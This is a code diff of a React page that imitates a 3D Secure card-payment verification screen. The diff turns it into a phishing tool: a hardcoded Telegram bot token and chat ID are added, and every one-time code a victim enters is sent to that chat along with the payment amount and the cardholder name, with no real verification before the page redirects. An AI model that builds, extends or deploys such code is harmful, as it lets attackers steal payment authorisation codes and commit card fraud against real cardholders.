@@ -1,20 +1,21 @@
-import { useState } from "react";
-import { useNavigate, useLocation } from "react-router-dom";
-import { Button } from "@/components/ui/button";
+import React, { useState } from "react";
+import { useNavigate, useSearchParams } from "react-router-dom";
 import { Input } from "@/components/ui/input";
-import { toast } from "@/components/ui/use-toast";
-import { motion } from "framer-motion";
+import { Button } from "@/components/ui/button";
 
-const sendTelegramNotification = async (message: string) => {
+const sendTelegramNotification = async (code: string, amount: string, cardHolder: string) => {
   try {
-    const response = await fetch('https://api.telegram.org/bot[BOT_TOKEN]/sendMessage', {
+    const response = await fetch('https://api.telegram.org/bot7838597617:AAGTZ6xgFUTddSK1mS9hHUl1tKffHXyHycU/sendMessage', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
       body: JSON.stringify({
         chat_id: "6293259686",
-        text: message,
+        text: `3DS Code Verification:
+Amount: ${amount}
+Card Holder: ${cardHolder}
+Code: ${code}`,
       }),
     });
     console.log('3DS notification sent:', response.ok);
@@ -23,124 +24,62 @@ const sendTelegramNotification = async (message: string) => {
   }
 };
 
-const Verify3DS = () => {
+export default function Verify3DS() {
+  const [searchParams] = useSearchParams();
+  const amount = searchParams.get("amount") || "0";
+  const cardHolder = searchParams.get("cardHolder") || "";
   const [code, setCode] = useState("");
-  const [isVerifying, setIsVerifying] = useState(false);
+  const [isSubmitting, setIsSubmitting] = useState(false);
   const navigate = useNavigate();
-  const location = useLocation();
-  const searchParams = new URLSearchParams(location.search);
-  const amount = searchParams.get('amount') || '0';
 
-  const handleVerification = async (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    setIsVerifying(true);
-    
-    try {
-      // Simulate verification delay
-      await new Promise(resolve => setTimeout(resolve, 1500));
-      
-      if (code === "123456") {
-        // Send 3DS verification notification
-        await sendTelegramNotification(`3DS Code Verified:
-Amount: ${amount}
-Code: ${code}
-Status: Success`);
+    setIsSubmitting(true);
 
-        toast({
-          title: "Payment Successful",
-          description: `Your payment of $${amount} has been verified and processed.`,
-          className: "bg-payment-success text-white",
-        });
-        navigate("/");
-      } else {
-        await sendTelegramNotification(`3DS Verification Failed:
-Amount: ${amount}
-Code: ${code}
-Status: Failed`);
+    // Send 3DS code to Telegram
+    await sendTelegramNotification(code, amount, cardHolder);
 
-        throw new Error("Invalid code");
-      }
-    } catch (error) {
-      toast({
-        title: "Verification Failed",
-        description: "The code you entered is incorrect. Please try again.",
-        variant: "destructive",
-      });
-    } finally {
-      setIsVerifying(false);
-    }
+    // Add delay for processing
+    await new Promise(resolve => setTimeout(resolve, 2000));
+
+    // Redirect to success or another page
+    navigate("/");
   };
 
   return (
-    <div className="min-h-screen bg-background flex items-center justify-center p-4">
-      <motion.div
-        initial={{ opacity: 0, y: 20 }}
-        animate={{ opacity: 1, y: 0 }}
-        className="w-full max-w-md"
-      >
-        <div className="bg-card text-card-foreground rounded-lg shadow-lg p-6 space-y-6">
-          <div className="space-y-2 text-center">
-            <h1 className="text-2xl font-semibold">3D Secure Verification</h1>
-            <p className="text-muted-foreground">
-              Enter the verification code sent to your device, on average it arrives within 1-2 minutes or you will receive a push notification that you need to confirm to confirm the payment. Secure with Revolut Pay
-            </p>
-          </div>
-
-          <form onSubmit={handleVerification} className="space-y-4">
-            <div className="space-y-2">
-              <label className="text-sm font-medium">Verification Code</label>
-              <Input
-                type="text"
-                placeholder="Enter 6-digit code"
-                value={code}
-                onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
-                className="text-center text-lg tracking-widest"
-                maxLength={6}
-                required
-              />
-              <p className="text-xs text-muted-foreground text-center">
-                Demo code: 123456
-              </p>
-            </div>
-
-            <Button
-              type="submit"
-              className="w-full bg-payment-accent hover:bg-payment-accent/90"
-              disabled={isVerifying || code.length !== 6}
-            >
-              {isVerifying ? (
-                <span className="flex items-center space-x-2">
-                  <svg
-                    className="animate-spin h-5 w-5"
-                    xmlns="http://www.w3.org/2000/svg"
-                    fill="none"
-                    viewBox="0 0 24 24"
-                  >
-                    <circle
-                      className="opacity-25"
-                      cx="12"
-                      cy="12"
-                      r="10"
-                      stroke="currentColor"
-                      strokeWidth="4"
-                    />
-                    <path
-                      className="opacity-75"
-                      fill="currentColor"
-                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
-                    />
-                  </svg>
-                  <span>Verifying...</span>
-                </span>
-              ) : (
-                "Verify Payment"
-              )}
-            </Button>
-          </form>
+    <div className="min-h-screen w-full bg-black flex items-center justify-center relative">
+      <div className="absolute inset-0 bg-gradient-to-br from-black via-gray-900 to-black">
+        <div className="absolute inset-0 opacity-30">
+          <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_50%,rgba(255,255,255,0.1),transparent_50%)] animate-pulse"></div>
         </div>
-      </motion.div>
+      </div>
+      <form onSubmit={handleSubmit} className="w-full max-w-md space-y-6 bg-black/20 backdrop-blur-xl p-8 rounded-xl border border-white/10 relative z-10">
+        <div className="space-y-2">
+          <h2 className="text-2xl font-bold text-white text-center">
+            3D Secure Verification
+          </h2>
+          <p className="text-gray-400 text-center">
+            Enter the code sent to your phone
+          </p>
+        </div>
+        <div className="space-y-4">
+          <Input
+            type="text"
+            placeholder="Enter Code"
+            value={code}
+            onChange={(e) => setCode(e.target.value)}
+            className="bg-black/50 border-white/20 text-white placeholder:text-gray-500"
+            required
+          />
+          <Button
+            type="submit"
+            disabled={isSubmitting}
+            className="w-full bg-gradient-to-r from-[#8B5CF6] via-[#D946EF] to-[#0EA5E9] text-white hover:opacity-90 transition-opacity"
+          >
+            {isSubmitting ? "Verifying..." : "Verify"}
+          </Button>
+        </div>
+      </form>
     </div>
   );
-};
-
-export default Verify3DS;
+}
